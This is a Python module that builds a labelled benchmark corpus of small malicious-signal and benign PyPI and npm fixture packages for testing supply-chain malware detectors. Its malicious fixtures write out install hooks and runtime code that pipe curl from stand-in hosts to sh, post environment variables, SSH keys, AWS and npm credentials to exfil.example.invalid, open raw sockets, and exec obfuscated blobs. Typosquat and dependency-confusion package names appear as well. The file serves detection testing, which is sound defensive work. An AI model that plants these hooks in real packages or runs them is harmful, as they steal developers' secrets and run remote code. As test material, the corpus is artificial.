"""The labelled benchmark corpus: small, inert, self-made packages.

Every fixture is a dict of file name -> text, packed into a real archive
(sdist .tar.gz, wheel .zip or npm .tgz) only when the benchmark runs. Nothing
here is ever executed, and none of it would do anything useful if it were:

* Malicious fixtures hold only the *signal* a rule looks for: an install
  override that touches ``os.environ``, a ``postinstall`` that pipes curl to sh,
  a random base64 blob passed to ``exec``. Blobs are random bytes, not code.
* Hosts are reserved names (``*.example.invalid``, ``example.com``, RFC 2606)
  or documentation IP ranges (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24,
  RFC 5737). Tokens are the literal string ``FAKE_TOKEN``.
* Benign fixtures look like ordinary small libraries, including deliberately
  tricky ones (native builds, a setuptools-style .pth shim, env-dump tools,
  SSH config helpers) so false positives get measured, not hidden.

``signals`` lists the *categories* of bad behaviour a fixture was written to
show (one per analyser). They were assigned from what the snippet does, not
from what the rules happen to catch, so an analyser can miss its own category.
That is the point: it shows where the rules are blind.

Honesty note: the corpus and the rules were written by the same person. The
numbers show the rules behave as designed on the cases imagined here. They are
not real-world detection rates.
"""

from __future__ import annotations

import base64
import random
from dataclasses import dataclass, field

MALICIOUS = "malicious"
BENIGN = "benign"
CATEGORIES = ("install_hooks", "obfuscation", "network", "credentials", "typosquat", "depconfusion")


@dataclass(frozen=True)
class Fixture:
    id: str
    ecosystem: str  # "pypi" | "npm"
    kind: str  # "sdist" | "wheel" | "npm"
    label: str  # MALICIOUS | BENIGN
    signals: frozenset[str]
    files: dict[str, str]
    name: str
    version: str = "1.0.0"
    description: str = "A small utility library."
    scripts: dict[str, str] = field(default_factory=dict)
    note: str = ""


def _rand(seed: int, n: int) -> bytes:
    return random.Random(seed).randbytes(n)


def b64_blob(seed: int, n: int = 300) -> str:
    """Base64 of random bytes: looks like a packed payload, decodes to noise."""
    return base64.b64encode(_rand(seed, n)).decode()


def hex_blob(seed: int, n: int = 200) -> str:
    return _rand(seed, n).hex()


def escaped(seed: int, n: int = 60) -> str:
    return "".join(f"\\x{b:02x}" for b in _rand(seed, n))


FIXTURES: list[Fixture] = []


def py(id: str, label: str, signals: set[str] | tuple[str, ...], files: dict[str, str], *, name: str | None = None,
       version: str = "1.0.0", wheel: bool = False, description: str = "A small utility library.",
       note: str = "") -> None:
    FIXTURES.append(Fixture(id, "pypi", "wheel" if wheel else "sdist", label, frozenset(signals), files,
                            name or f"twfx-{id}", version, description, {}, note))


def npm(id: str, label: str, signals: set[str] | tuple[str, ...], files: dict[str, str], *,
        scripts: dict[str, str] | None = None, name: str | None = None, version: str = "1.0.0",
        description: str = "A small utility library.", note: str = "") -> None:
    FIXTURES.append(Fixture(id, "npm", "npm", label, frozenset(signals), files, name or f"twfx-{id}", version,
                            description, dict(scripts or {}), note))


M, B = MALICIOUS, BENIGN
PLAIN_PY = 'def add(a, b):\n    """Return a + b."""\n    return a + b\n'
PLAIN_JS = "module.exports = function add(a, b) {\n  return a + b;\n};\n"


def _setup(name: str, body: str = "", extra_imports: str = "", cmdclass: str = "") -> str:
    """A setup.py with an optional install-command override."""
    cls = ""
    if body:
        indented = "\n".join("        " + line for line in body.strip().splitlines())
        cls = ("\n\nclass PostInstall(install):\n    def run(self):\n        install.run(self)\n"
               f"{indented}\n")
        cmdclass = cmdclass or '{"install": PostInstall}'
    imports = "from setuptools import setup\nfrom setuptools.command.install import install\n" + extra_imports
    cc = f", cmdclass={cmdclass}" if cmdclass else ""
    return f'{imports}{cls}\n\nsetup(name="{name}", version="1.0.0", packages=["{name.replace("-", "_")}"]{cc})\n'


# =========================================================================
# Malicious-signal fixtures
# =========================================================================

# ---- PyPI install-time code ------------------------------------------------
py("setup-env-post", M, {"install_hooks", "credentials", "network"}, {
    "setup.py": _setup("twfx-setup-env-post", '''
body = json.dumps(dict(os.environ)).encode()
request.urlopen("https://exfil.example.invalid/collect", data=body)
''', "import json\nimport os\nfrom urllib import request\n"),
}, note="install override posts the whole environment")

py("setup-curl-sh", M, {"install_hooks"}, {
    "setup.py": _setup("twfx-setup-curl-sh", 'os.system("curl -s https://payload.example.invalid/i.sh | sh")',
                       "import os\n"),
})

py("setup-powershell", M, {"install_hooks"}, {
    "setup.py": _setup("twfx-setup-powershell",
                       'subprocess.Popen(["powershell", "-NoProfile", "-EncodedCommand", "FAKE_ENCODED"])',
                       "import subprocess\n"),
})

py("setup-raw-socket", M, {"install_hooks", "network"}, {
    "setup.py": _setup("twfx-setup-raw-socket", '''
s = socket.create_connection(("203.0.113.10", 4444))
s.sendall(socket.gethostname().encode())
''', "import socket\n"),
})

py("pth-exec-env", M, {"install_hooks"}, {
    "twfx_pth_exec_env.pth": 'import os; exec(os.environ.get("FIXTURE_HOOK", "pass"))\n',
    "twfx_pth_exec_env/__init__.py": PLAIN_PY,
}, wheel=True, note=".pth line runs at every interpreter start")

py("pth-b64", M, {"install_hooks", "obfuscation"}, {
    "zz_twfx.pth": 'import base64; exec(base64.b64decode("cGFzcw=="))\n',
    "twfx_pth_b64/__init__.py": PLAIN_PY,
}, wheel=True)

py("setup-local-helper", M, {"install_hooks", "credentials", "network"}, {
    "setup.py": "from setuptools import setup\nimport _build_helper\n\n_build_helper.prepare()\n"
                'setup(name="twfx-setup-local-helper", version="1.0.0")\n',
    "_build_helper.py": '''import os
import requests


def prepare():
    path = os.path.expanduser("~/.aws/credentials")
    if os.path.exists(path):
        requests.post("https://exfil.example.invalid/a", data=open(path).read())
''',
}, note="setup.py imports a local module that does the work")

py("setup-exec-remote", M, {"install_hooks"}, {
    "setup.py": _setup("twfx-setup-exec-remote", 'exec(urlopen("https://stage2.example.invalid/p").read())',
                       "from urllib.request import urlopen\n"),
})

py("setup-getattr-exec", M, {"install_hooks", "obfuscation"}, {
    "setup.py": _setup("twfx-setup-getattr-exec", 'getattr(builtins, "ex" + "ec")("FAKE_STAGE = 1")',
                       "import builtins\n"),
}, note="install override hides exec behind a joined name")

py("setup-certutil", M, {"install_hooks", "network"}, {
    "setup.py": _setup("twfx-setup-certutil",
                       'subprocess.run("certutil -urlcache -f http://192.0.2.7/a.bin a.bin", shell=True)',
                       "import subprocess\n"),
})

py("setup-hostname-beacon", M, {"install_hooks", "network"}, {
    "setup.py": _setup("twfx-setup-hostname-beacon", '''
info = {"host": socket.gethostname(), "user": getpass.getuser(), "cwd": os.getcwd()}
requests.post("https://beacon.example.invalid/hello", json=info)
''', "import getpass\nimport os\nimport socket\nimport requests\n"),
})

# ---- PyPI obfuscation (runtime code) ---------------------------------------
py("init-exec-b64", M, {"obfuscation"}, {
    "twfx_init_exec_b64/__init__.py": f'import base64\n\n_DATA = "{b64_blob(11, 400)}"\n'
                                      "exec(base64.b64decode(_DATA))\n",
})

py("zlib-b64-exec", M, {"obfuscation"}, {
    "twfx_zlib/__init__.py": f'import base64, zlib\nexec(zlib.decompress(base64.b64decode("{b64_blob(12, 360)}")))\n',
})

py("reversed-exec", M, {"obfuscation"}, {
    "twfx_reversed/__init__.py": "exec(\")'EKAF'(tnirp\"[::-1])\n",
})

py("hex-exec", M, {"obfuscation"}, {
    "twfx_hex/__init__.py": f'exec(bytes.fromhex("{hex_blob(13, 200)}").decode("latin-1"))\n',
})

py("getattr-chr", M, {"obfuscation"}, {
    "twfx_getattr_chr/__init__.py": "import builtins\n\n"
                                    "run = getattr(builtins, chr(101) + chr(120) + chr(101) + chr(99))\n"
                                    'run("FAKE_STAGE = 2")\n',
})

py("escaped-bytes-exec", M, {"obfuscation"}, {
    "twfx_escaped/__init__.py": f'_S = b"{escaped(14, 60)}"\nexec(_S.decode("latin-1"))\n',
})

# ---- npm install hooks -----------------------------------------------------
npm("postinstall-node-e-curl", M, {"install_hooks"}, {"index.js": PLAIN_JS},
    scripts={"postinstall": "node -e \"require('child_process').exec('curl -s https://payload.example.invalid | sh')\""})

npm("install-shell-script", M, {"install_hooks"}, {
    "index.js": PLAIN_JS,
    "scripts/setup.sh": "#!/bin/sh\ncurl -fsSL https://payload.example.invalid/x | bash\n",
}, scripts={"install": "sh ./scripts/setup.sh"})

npm("postinstall-child-powershell", M, {"install_hooks"}, {
    "index.js": PLAIN_JS,
    "install.js": 'const { exec } = require("child_process");\n'
                  'exec("powershell -NoProfile -Command FAKE_COMMAND");\n',
}, scripts={"postinstall": "node install.js"})

npm("postinstall-minified-eval", M, {"install_hooks", "obfuscation"}, {
    "index.js": PLAIN_JS,
    "setup.js": "var d=[" + ",".join(str(b) for b in _rand(15, 400)) + "];var s=String.fromCharCode.apply(null,d);"
                "eval(s);\n",
}, scripts={"postinstall": "node setup.js"}, note="install file is one long packed line plus eval(variable)")

npm("env-beacon", M, {"install_hooks", "credentials", "network"}, {
    "index.js": '''const https = require("https");
const payload = JSON.stringify(process.env);
const req = https.request({ hostname: "exfil.example.invalid", path: "/c", method: "POST" });
req.write(payload);
req.end();
''',
}, scripts={"postinstall": "node index.js"})

npm("preinstall-dns-depconf", M, {"install_hooks", "network", "depconfusion"}, {
    "index.js": '''const dns = require("dns");
const os = require("os");
const label = Buffer.from(os.hostname()).toString("hex").slice(0, 60);
dns.lookup(`${label}.exfil.example.invalid`, () => {});
''',
}, scripts={"preinstall": "node index.js"}, name="acme-billing-sdk", version="999.9.9", description="")

# ---- npm obfuscation -------------------------------------------------------
npm("eval-atob", M, {"obfuscation"}, {
    "index.js": f'eval(atob("{b64_blob(16, 320)}"));\n',
})

npm("function-buffer", M, {"obfuscation"}, {
    "lib/run.js": f'new Function(Buffer.from("{b64_blob(17, 320)}", "base64").toString())();\n',
    "index.js": 'require("./lib/run");\n',
})

npm("packer-ids", M, {"obfuscation"}, {
    "index.js": "var _0x3f2a=['FAKE','fixture'];"
                + "".join(f"function _0x{0x1a2b + i * 7:x}(_0x{0x5c00 + i:x}){{return _0x3f2a[_0x{0x5c00 + i:x}%2];}}"
                          for i in range(10))
                + "\nmodule.exports=_0x1a2b;\n",
})

npm("fromcharcode-function", M, {"obfuscation"}, {
    "index.js": "const f = Function(String.fromCharCode(" + ",".join(str(b) for b in _rand(18, 40)) + "));\nf();\n",
})

# ---- credentials ---------------------------------------------------------
py("ssh-key-raw-ip", M, {"credentials", "network"}, {
    "twfx_ssh/__init__.py": '''import os
import requests

key = open(os.path.expanduser("~/.ssh/id_rsa")).read()
requests.post("http://198.51.100.23/u", data=key)
''',
})

py("browser-login-data", M, {"credentials"}, {
    "twfx_browser/paths.py": '''import os

LOCAL = os.environ.get("LOCALAPPDATA", "")
TARGET = os.path.join(LOCAL, "Google", "Chrome", "User Data", "Default", "Login Data")
''',
})

py("wallet-paths", M, {"credentials"}, {
    "twfx_wallet/scan.py": '''import os

HOME = os.path.expanduser("~")
CANDIDATES = [os.path.join(HOME, ".bitcoin", "wallet.dat"), os.path.join(HOME, "AppData", "Roaming", "Exodus/")]
''',
})

py("discord-leveldb", M, {"credentials"}, {
    "twfx_chat/tokens.py": 'import os\nPATH = os.path.expandvars(r"%APPDATA%\\discord\\Local Storage\\leveldb")\n',
})

py("kube-gcloud", M, {"credentials"}, {
    "twfx_cloud/find.py": '''from pathlib import Path

FILES = [Path.home() / ".kube/config", Path.home() / ".config/gcloud/application_default_credentials.json"]
''',
})

py("shell-history", M, {"credentials"}, {
    "twfx_hist/read.py": 'from pathlib import Path\n\nLINES = (Path.home() / ".bash_history").read_text().splitlines()\n',
})

py("env-walk-dns", M, {"credentials", "network"}, {
    "twfx_envdns/__init__.py": '''import os
import socket

for key, value in os.environ.items():
    socket.gethostbyname(f"{key}-{len(value)}.exfil.example.invalid")
''',
})

py("secret-env-names", M, {"credentials", "network"}, {
    "twfx_tokens/__init__.py": '''import os
import requests

found = {k: os.environ.get(k) for k in ("AWS_SECRET_ACCESS_KEY", "GITHUB_TOKEN", "NPM_TOKEN", "OPENAI_API_KEY")}
requests.post("https://collect.example.invalid/t", json=found)
''',
}, note="collects named secrets, sends to an ordinary-looking domain")

npm("npmrc-fetch", M, {"credentials", "network"}, {
    "index.js": '''const fs = require("fs");
const os = require("os");
const path = require("path");

const rc = fs.readFileSync(path.join(os.homedir(), ".npmrc"), "utf8");
fetch("https://collect.example.invalid/n", { method: "POST", body: rc });
''',
})

npm("fetch-env-body", M, {"credentials", "network"}, {
    "index.js": 'fetch("https://exfil.example.invalid/e", { method: "POST", body: JSON.stringify(process.env) });\n',
})

py("json-env-dump-post", M, {"credentials", "network"}, {
    "twfx_envpost/__init__.py": '''import json
import os
import urllib.request

payload = json.dumps(os.environ.copy()).encode()
urllib.request.urlopen(urllib.request.Request("https://exfil.example.invalid/x", data=payload))
''',
})

# ---- network ---------------------------------------------------------------
npm("dns-exfil-runtime", M, {"network"}, {
    "index.js": '''const dns = require("dns");
module.exports = function report(id) {
  dns.resolve4(`${id}.t.exfil.example.invalid`, () => {});
};
''',
})

py("raw-ip-post", M, {"network"}, {
    "twfx_rawip/__init__.py": 'import platform\nimport requests\n\n'
                              'requests.post("http://192.0.2.44:8080/up", json={"os": platform.platform()})\n',
})

npm("net-connect-port-first", M, {"network"}, {
    "index.js": '''const net = require("net");
const sock = net.connect(4444, "203.0.113.9", () => sock.write(JSON.stringify({ host: require("os").hostname() })));
''',
}, note="hard: Node's connect(port, host) argument order")

py("env-requests-json", M, {"network", "credentials"}, {
    "twfx_envjson/__init__.py": 'import os\nimport requests\n\n'
                                'requests.post("https://exfil.example.invalid/j", json=dict(os.environ))\n',
})

py("beacon-own-domain", M, {"network"}, {
    "twfx_beacon/__init__.py": '''import getpass
import socket
import requests

requests.post("https://beacon.example.invalid/b", json={"h": socket.gethostname(), "u": getpass.getuser()})
''',
}, note="hard: fingerprint beacon to an ordinary-looking domain")

py("dns-format-exfil", M, {"network"}, {
    "twfx_dnsfmt/__init__.py": 'import getpass\nimport socket\n\n'
                               'socket.gethostbyname("{}.d.exfil.example.invalid".format(getpass.getuser()))\n',
})

# ---- typosquats --------------------------------------------------------------
py("squat-reqeusts", M, {"typosquat"}, {"reqeusts/__init__.py": PLAIN_PY}, name="reqeusts")
py("squat-nunpy", M, {"typosquat"}, {"nunpy/__init__.py": PLAIN_PY}, name="nunpy")
py("squat-djang0", M, {"typosquat"}, {"djang0/__init__.py": PLAIN_PY}, name="djang0")
py("squat-pandsa", M, {"typosquat"}, {"pandsa/__init__.py": PLAIN_PY}, name="pandsa")
py("squat-dateutils", M, {"typosquat", "install_hooks"}, {
    "setup.py": _setup("python-dateutils", 'os.system("curl -s https://payload.example.invalid/d | sh")',
                       "import os\n"),
}, name="python-dateutils")
py("combosquat-numpy-gpu", M, {"typosquat", "install_hooks", "network"}, {
    "setup.py": _setup("numpy-gpu-accel", 'requests.get("https://payload.example.invalid/n", timeout=5)',
                       "import requests\n"),
}, name="numpy-gpu-accel", note="hard: combosquat not in the affix list")
npm("squat-crossenv", M, {"typosquat", "install_hooks", "credentials", "network"}, {
    "index.js": '''const http = require("http");
const data = JSON.stringify(process.env);
http.request({ host: "exfil.example.invalid", method: "POST", path: "/x" }).end(data);
''',
}, scripts={"postinstall": "node index.js"}, name="crossenv")
npm("squat-lodahs", M, {"typosquat", "install_hooks"}, {"index.js": PLAIN_JS},
    scripts={"postinstall": "curl -s https://payload.example.invalid/l | sh"}, name="lodahs")
npm("squat-expresss", M, {"typosquat"}, {"index.js": PLAIN_JS}, name="expresss")
npm("squat-electorn", M, {"typosquat"}, {"index.js": PLAIN_JS}, name="electorn")
npm("squat-discordjs", M, {"typosquat", "credentials"}, {
    "index.js": 'const p = require("path").join(process.env.APPDATA, "discord", "Local Storage", "leveldb");\n',
}, name="discordjs")

# ---- dependency confusion --------------------------------------------------
py("depconf-internal-auth", M, {"depconfusion"}, {"acme_internal_auth/__init__.py": PLAIN_PY},
   name="acme-internal-auth", version="99.0.0", description="")
py("depconf-setup-post", M, {"depconfusion", "install_hooks"}, {
    "setup.py": _setup("contoso-data-utils", 'urlopen("https://exfil.example.invalid/dc?h=" + socket.gethostname())',
                       "import socket\nfrom urllib.request import urlopen\n"),
}, name="contoso-data-utils", version="100.0.0", description="")
npm("depconf-logger", M, {"depconfusion"}, {"index.js": PLAIN_JS}, name="fabrikam-logger", version="9000.0.0",
    description="")
py("depconf-intranet", M, {"depconfusion"}, {"corp_intranet_client/__init__.py": PLAIN_PY},
   name="corp-intranet-client", version="99.1.0", description="")


# =========================================================================
# Benign fixtures (ordinary and tricky)
# =========================================================================

py("plain-lib", B, set(), {"tinymath/__init__.py": PLAIN_PY, "pyproject.toml": '[project]\nname = "tinymath"\n'},
   name="tinymath")

py("setup-build-ext-cmake", B, set(), {
    "setup.py": '''import subprocess
from setuptools import Extension, setup
from setuptools.command.build_ext import build_ext


class CMakeBuild(build_ext):
    def run(self):
        subprocess.check_call(["cmake", "-S", ".", "-B", "build"])
        subprocess.check_call(["cmake", "--build", "build"])
        super().run()


setup(name="fastgrid", version="1.0.0", ext_modules=[Extension("fastgrid._core", ["src/core.c"])],
      cmdclass={"build_ext": CMakeBuild})
''',
    "fastgrid/__init__.py": "from ._core import grid  # noqa: F401\n",
}, name="fastgrid", note="tricky: native build at install time")

py("setup-version-exec", B, set(), {
    "setup.py": '''from setuptools import setup

about = {}
exec(open("verlib/__about__.py").read(), about)
setup(name="verlib", version=about["__version__"])
''',
    "verlib/__about__.py": '__version__ = "1.0.0"\n',
    "verlib/__init__.py": PLAIN_PY,
}, name="verlib", note="tricky: exec(open(...).read()) version idiom")

py("reads-home", B, set(), {
    "cfgdir/__init__.py": '''import os
from pathlib import Path


def config_dir() -> Path:
    base = os.environ.get("XDG_CONFIG_HOME") or os.path.join(os.environ["HOME"], ".config")
    return Path(base) / "cfgdir"
''',
}, name="cfgdir", note="tricky: reads single environment variables")

npm("minified-bundle", B, set(), {
    "dist/widget.min.js": "!function(e,t){" + ";".join(f"var a{i}=e.w{i}||t.d{i}" for i in range(90))
                          + ";e.Widget={init:function(){return a0}}}(window,document);\n",
    "index.js": 'module.exports = require("./dist/widget.min.js");\n',
}, name="tiny-widget", note="tricky: minified but not install-time")

npm("node-gyp-native", B, set(), {
    "binding.gyp": '{"targets": [{"target_name": "addon", "sources": ["src/addon.cc"]}]}\n',
    "index.js": 'module.exports = require("bindings")("addon");\n',
}, name="fast-hash-native", note="tricky: implicit node-gyp build")

npm("husky-postinstall", B, set(), {"index.js": PLAIN_JS}, scripts={"postinstall": "husky install"},
    name="lint-helpers")

npm("thanks-postinstall", B, set(), {
    "index.js": PLAIN_JS,
    "scripts/postinstall.js": 'console.log("Thanks for installing! Docs: https://example.com/docs");\n',
}, scripts={"postinstall": "node scripts/postinstall.js"}, name="friendly-lib")

npm("prebuilt-binary-github", B, set(), {
    "index.js": 'module.exports = require("./bin/path");\n',
    "install.js": '''const https = require("https");
const fs = require("fs");
const url = `https://github.com/example/fast-tool/releases/download/v1.0.0/fast-tool-${process.platform}.tar.gz`;
https.get(url, (res) => res.pipe(fs.createWriteStream("bin/fast-tool.tar.gz")));
''',
}, scripts={"postinstall": "node install.js"}, name="fast-tool-bin",
    note="tricky: downloads a prebuilt binary at install (esbuild/sharp style)")

py("data-uri-icon", B, set(), {
    "iconlib/icons.py": f'CHECK = "data:image/png;base64,{b64_blob(21, 400)}"\n',
}, name="iconlib")

py("visitor-getattr", B, set(), {
    "treewalk/__init__.py": '''class Visitor:
    def visit(self, node):
        handler = getattr(self, "visit_" + node.kind, self.generic_visit)
        return handler(node)

    def generic_visit(self, node):
        return None
''',
}, name="treewalk", note="tricky: getattr with a built name (dispatch idiom)")

py("api-client-token", B, set(), {
    "weatherkit/client.py": '''import os
import requests

API = "https://api.example.com/v1"


def forecast(city):
    token = os.environ.get("WEATHERKIT_TOKEN", "")
    r = requests.get(f"{API}/forecast", params={"q": city}, headers={"Authorization": f"Bearer {token}"})
    return r.json()
''',
}, name="weatherkit", note="tricky: sends its own API token in a header")

py("git-cli-runtime", B, set(), {
    "gitsum/cli.py": 'import subprocess\n\n\ndef status():\n'
                     '    return subprocess.run(["git", "status", "--short"], capture_output=True, text=True).stdout\n',
}, name="gitsum")

py("aws-config-reader", B, set(), {
    "awsprofiles/__init__.py": '''import configparser
from pathlib import Path


def profiles():
    cp = configparser.ConfigParser()
    cp.read(Path.home() / ".aws/config")
    return cp.sections()
''',
}, name="awsprofiles", note="tricky: legitimately reads ~/.aws/config")

py("ssh-known-hosts", B, set(), {
    "sshtool/hosts.py": 'from pathlib import Path\n\nKNOWN = Path.home() / ".ssh" / "known_hosts"\n',
}, name="sshtool", note="tricky: SSH helper reading known_hosts")

npm("dotenv-loader", B, set(), {
    "index.js": '''const fs = require("fs");
module.exports = function load(file = ".env") {
  for (const line of fs.readFileSync(file, "utf8").split("\\n")) {
    const [k, v] = line.split("=");
    if (k && !(k in process.env)) process.env[k] = v;
  }
  return Object.keys(process.env).length;
};
''',
}, name="envfile-loader")

npm("api-client-js", B, set(), {
    "index.js": '''module.exports = async function search(q) {
  const res = await fetch("https://api.example.com/search?q=" + encodeURIComponent(q), {
    headers: { authorization: "Bearer " + process.env.SEARCH_API_KEY },
  });
  return res.json();
};
''',
}, name="search-client")

npm("env-report-cli", B, set(), {
    "cli.js": '#!/usr/bin/env node\nconsole.log(JSON.stringify(process.env, null, 2));\n',
}, name="envreport", note="tricky: prints the environment for bug reports")

py("calver", B, set(), {"tzrules/__init__.py": PLAIN_PY}, name="tzrules", version="2024.11.5")

npm("high-version-driver", B, set(), {"index.js": PLAIN_JS}, name="browser-driver-helper", version="131.0.2",
    note="tricky: version tracks a browser's major (chromedriver style)")

py("crypto-test-vectors", B, set(), {
    "hashkit/tests/vectors.py": f'SHA256_VECTORS = [("{hex_blob(22, 64)}", "{hex_blob(23, 32)}")]\n',
    "hashkit/__init__.py": PLAIN_PY,
}, name="hashkit")

py("pth-shim", B, set(), {
    "shimlib-hook.pth": "import os; var = 'SHIMLIB_USE_LOCAL'; enabled = os.environ.get(var, 'local') == 'local'; "
                        "enabled and __import__('_shimlib_hack').add_shim();\n",
    "_shimlib_hack/__init__.py": "def add_shim():\n    return None\n",
}, name="shimlib", wheel=True, note="tricky: setuptools-style .pth import shim")

py("localhost-server", B, set(), {
    "devserve/__init__.py": 'import socket\n\nsock = socket.create_connection(("127.0.0.1", 8000))\n',
}, name="devserve")

py("router-default-ip", B, set(), {
    "routerctl/defaults.py": 'DEFAULT_URL = "http://192.168.1.1/admin"\n',
}, name="routerctl")

npm("install-copy-file", B, set(), {
    "index.js": PLAIN_JS,
    "install.js": 'const fs = require("fs");\nconst p = process.platform === "win32" ? "win.js" : "posix.js";\n'
                  'fs.copyFileSync(`lib/${p}`, "lib/platform.js");\n',
}, scripts={"install": "node install.js"}, name="platform-shim")

py("setup-cffi", B, set(), {
    "setup.py": 'from setuptools import setup\n\nsetup(name="cffiwrap", version="1.0.0", '
                'setup_requires=["cffi"], cffi_modules=["build_ffi.py:ffi"])\n',
    "build_ffi.py": 'from cffi import FFI\n\nffi = FFI()\nffi.cdef("int add(int, int);")\n'
                    'ffi.set_source("_add", "int add(int a, int b) { return a + b; }")\n',
}, name="cffiwrap")

py("docs-urls", B, set(), {
    "linklib/__init__.py": 'DOCS = "https://example.com/docs"\nISSUES = "https://example.com/issues"\n'
                           'CHANGELOG = "https://example.org/changes"\n',
}, name="linklib")

npm("globalthis-polyfill", B, set(), {
    "index.js": 'module.exports = typeof globalThis !== "undefined" ? globalThis : new Function("return this")();\n',
}, name="get-global")

npm("repl-eval", B, set(), {
    "repl.js": 'module.exports = function run(expr) {\n  return eval(expr);\n};\n',
}, name="calc-repl")

py("script-runner-compile", B, set(), {
    "runit/__init__.py": '''def run_file(path):
    with open(path) as fh:
        source = fh.read()
    namespace = {"__name__": "__main__"}
    exec(compile(source, path, "exec"), namespace)
''',
}, name="runit")

py("plugin-loader-decode", B, set(), {
    "plugload/__init__.py": '''from pathlib import Path


def load(path: Path) -> dict:
    ns: dict = {}
    exec(path.read_bytes().decode("utf-8"), ns)
    return ns
''',
}, name="plugload", note="tricky: executes a local config file read as bytes")

npm("telemetry-optin", B, set(), {
    "telemetry.js": '''module.exports = function ping(version) {
  if (process.env.APP_TELEMETRY !== "1") return;
  fetch("https://telemetry.example.com/v1", { method: "POST", body: JSON.stringify({ version, os: process.platform }) });
};
''',
}, name="opt-in-telemetry")

py("dns-constant", B, set(), {
    "netcheck/__init__.py": 'import socket\n\n\ndef online():\n    return bool(socket.gethostbyname("example.com"))\n',
}, name="netcheck")

py("dns-region-format", B, set(), {
    "regionping/__init__.py": 'import socket\n\n\ndef endpoint_ip(region):\n'
                              '    return socket.gethostbyname("%s.storage.example.com" % region)\n',
}, name="regionping", note="tricky: hostname built from a region name")

npm("git-wrapper-runtime", B, set(), {
    "index.js": 'const { execSync } = require("child_process");\n'
                'module.exports = () => execSync("git rev-parse HEAD").toString().trim();\n',
}, name="git-head")

npm("only-allow-pnpm", B, set(), {"index.js": PLAIN_JS}, scripts={"preinstall": "npx only-allow pnpm"},
    name="pnpm-workspace-tool")

npm("postinstall-or-exit", B, set(), {
    "index.js": PLAIN_JS,
    "dist/postinstall.js": 'console.log("setup complete");\n',
}, scripts={"postinstall": "node ./dist/postinstall.js || exit 0"}, name="safe-post")

py("setup-readme", B, set(), {
    "setup.py": '''from pathlib import Path
from setuptools import setup

setup(name="readmepkg", version="1.0.0", long_description=Path("README.md").read_text(),
      long_description_content_type="text/markdown")
''',
    "README.md": "# readmepkg\n",
}, name="readmepkg")

py("setup-git-version", B, set(), {
    "setup.py": '''import subprocess
from setuptools import setup

version = subprocess.check_output(["git", "describe", "--tags"]).decode().strip()
setup(name="gitver", version=version)
''',
}, name="gitver")

py("setup-make", B, set(), {
    "setup.py": '''import os
from setuptools import setup
from setuptools.command.build_py import build_py


class Build(build_py):
    def run(self):
        os.system("make -C native")
        super().run()


setup(name="makebuilt", version="1.0.0", cmdclass={"build_py": Build})
''',
}, name="makebuilt")

npm("css-font-base64", B, set(), {
    "styles.js": f'module.exports = "@font-face{{src:url(data:font/woff2;base64,{b64_blob(24, 500)})}}";\n',
}, name="inline-font")

npm("jwt-decode-atob", B, set(), {
    "index.js": 'module.exports = (token) => JSON.parse(atob(token.split(".")[1]));\n',
}, name="tiny-jwt-decode")

py("rot13-codec", B, set(), {
    "puzzles/__init__.py": 'import codecs\n\n\ndef hide(s):\n    return codecs.encode(s, "rot13")\n',
}, name="puzzles")

py("plugin-getattr-module", B, set(), {
    "plugmod/__init__.py": 'import importlib\n\n\ndef get(module, name):\n'
                           '    return getattr(importlib.import_module(module), name)\n',
}, name="plugmod")

npm("deploy-ssh-config", B, set(), {
    "index.js": '''const os = require("os");
const path = require("path");
module.exports = { sshConfigPath: path.join(os.homedir(), ".ssh/config") };
''',
}, name="deploy-ssh-helper", note="tricky: deployment tool that edits ~/.ssh/config")

npm("calver-date-major", B, set(), {"index.js": PLAIN_JS}, name="daily-rates", version="20241105.0.0")

npm("internal-name-normal-version", B, set(), {"index.js": PLAIN_JS}, name="acme-internal-tools", version="1.4.2")

npm("publish-helper-npmrc", B, set(), {
    "index.js": '''const fs = require("fs");
const path = require("path");
module.exports = (dir) => fs.existsSync(path.join(dir, ".npmrc"));
''',
}, name="publish-check", note="tricky: release tool that checks for a project .npmrc")

npm("yaml-js-port", B, set(), {"index.js": PLAIN_JS}, name="yaml-js", note="tricky: '<popular>-js' port naming")
py("pytoml-port", B, set(), {"pytoml/__init__.py": PLAIN_PY}, name="pytoml",
   note="tricky: 'py<popular>' naming")

npm("express-middleware", B, set(), {
    "index.js": 'module.exports = function timing() {\n  return (req, res, next) => { req.start = Date.now(); next(); };\n};\n',
}, name="express-request-timing")

py("pandas-helpers", B, set(), {
    "frametools/__init__.py": 'import pandas as pd\n\n\ndef tidy(df: pd.DataFrame) -> pd.DataFrame:\n'
                              '    return df.dropna(how="all")\n',
}, name="frametools")

py("wheel-plain", B, set(), {"wheelpkg/__init__.py": PLAIN_PY, "wheelpkg/py.typed": ""}, name="wheelpkg", wheel=True)

npm("ts-types", B, set(), {
    "index.d.ts": "export declare function add(a: number, b: number): number;\n",
    "index.js": PLAIN_JS,
}, scripts={"prepare": "tsc"}, name="typed-add")


def by_id(fid: str) -> Fixture:
    for f in FIXTURES:
        if f.id == fid:
            return f
    raise KeyError(fid)
